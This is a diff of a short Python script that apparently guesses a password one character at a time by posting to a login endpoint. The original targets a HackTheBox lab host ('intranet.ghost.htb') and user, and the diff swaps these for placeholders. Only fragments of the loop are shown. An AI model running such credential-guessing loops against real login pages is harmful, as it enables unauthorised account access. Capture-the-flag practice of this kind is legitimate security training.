@@ -1,10 +1,10 @@
 import requests
 import string
 
-username = "gitea_temp_principal"
+username = "test"
 password = ""
 chars = string.printable[:-5]
-headers = {"Next-Action": "c471eb076ccac91d6f828b671795550fd5925940"}
+headers = {"Next-Action": "test"}
 
 while True:
         for c in chars:
@@ -16,7 +16,7 @@ while True:
                 }
 
                 response = requests.post(
-                        'http://intranet.ghost.htb:8008/login',
+                        'http://yourmom:1234/login',
                         headers=headers,
                         files=files
                         )
